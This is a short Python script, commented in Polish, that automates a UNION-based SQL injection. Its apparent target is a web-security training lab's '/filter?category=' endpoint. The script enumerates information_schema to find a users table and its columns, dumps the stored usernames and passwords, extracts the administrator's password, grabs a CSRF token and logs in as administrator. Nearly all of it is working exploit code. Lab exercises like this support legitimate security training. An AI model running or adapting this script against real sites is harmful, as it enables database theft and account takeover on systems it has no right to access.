import requests
import sys
import re

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

    base_url = sys.argv[1]
    burp_headers = {}

    # Tworzenie sesji
    session = requests.Session()

    # Pierwsze zapytanie GET aby uzyskać ciasteczko sesyjne
    r = session.get(base_url + "/filter?category=' UNION SELECT table_name, NULL FROM information_schema.tables--", headers=burp_headers)
    response_text = r.text

    pattern_user = r'users_[a-z]{6}'
    username_table = re.search(pattern_user, response_text).group(0)

    burp_url2 = base_url + f"/filter?category=' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='{username_table}'--"
    t = session.get(burp_url2, headers=burp_headers)
    response_text2 = t.text

    pattern_username = r'username_[a-z]{6}'
    username_do_sql = re.search(pattern_username, response_text2).group(0)
    pattern_password = r'password_[a-z]{6}'
    password_do_sql = re.search(pattern_password, response_text2).group(0)

    burp_url3 = base_url + f"/filter?category=' UNION SELECT {username_do_sql}, {password_do_sql} FROM {username_table}--"
    x = session.get(burp_url3, headers=burp_headers)
    response_text3 = x.text

    pattern_admin_password = r'<th>administrator</th>\s*<td>(.*?)</td>'
    admin_password_match = re.search(pattern_admin_password, response_text3)

    admin_password = admin_password_match.group(1)
    print(f"Administrator Password: {admin_password}")

    burp_url_login = base_url + '/login'

    csrf_response = session.get(burp_url_login, headers=burp_headers)
    csrf_token = re.search(r'name="csrf" value="(.*?)">', csrf_response.text).group(1)
    print(f"CSRF Token: {csrf_token}")

    login_data = {
        'csrf': csrf_token,
        'username': 'administrator',
        'password': admin_password
    }

    login_response = session.post(burp_url_login, headers=burp_headers, data=login_data)
